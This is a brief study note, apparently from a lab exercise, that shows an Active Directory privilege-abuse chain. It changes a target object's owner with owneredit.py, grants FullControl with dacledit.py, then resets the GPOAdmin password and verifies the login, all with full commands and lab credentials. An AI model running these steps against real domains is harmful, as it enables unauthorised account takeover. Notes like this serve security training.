#### Downloading and Using owneredit.py
```shell
https://github.com/ShutdownRepo/impacket/raw/refs/heads/owneredit/examples/owneredit.py
owneredit.py -action write -new-owner pedro -target GPOAdmin -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
```
![[Pasted image 20251230154334.png]]
#### Changing User Rights with dacledit.py
```shell
dacledit.py -principal pedro -target GPOAdmin -action write -rights FullControl -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
```
![[Pasted image 20251230154431.png]]
Now, we can perform the password reset and test that the credentials are correct:
```shell
net rpc password GPOAdmin Mynewpassword1 -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81
netexec ldap 10.129.205.81 -u GPOAdmin -p Mynewpassword1
```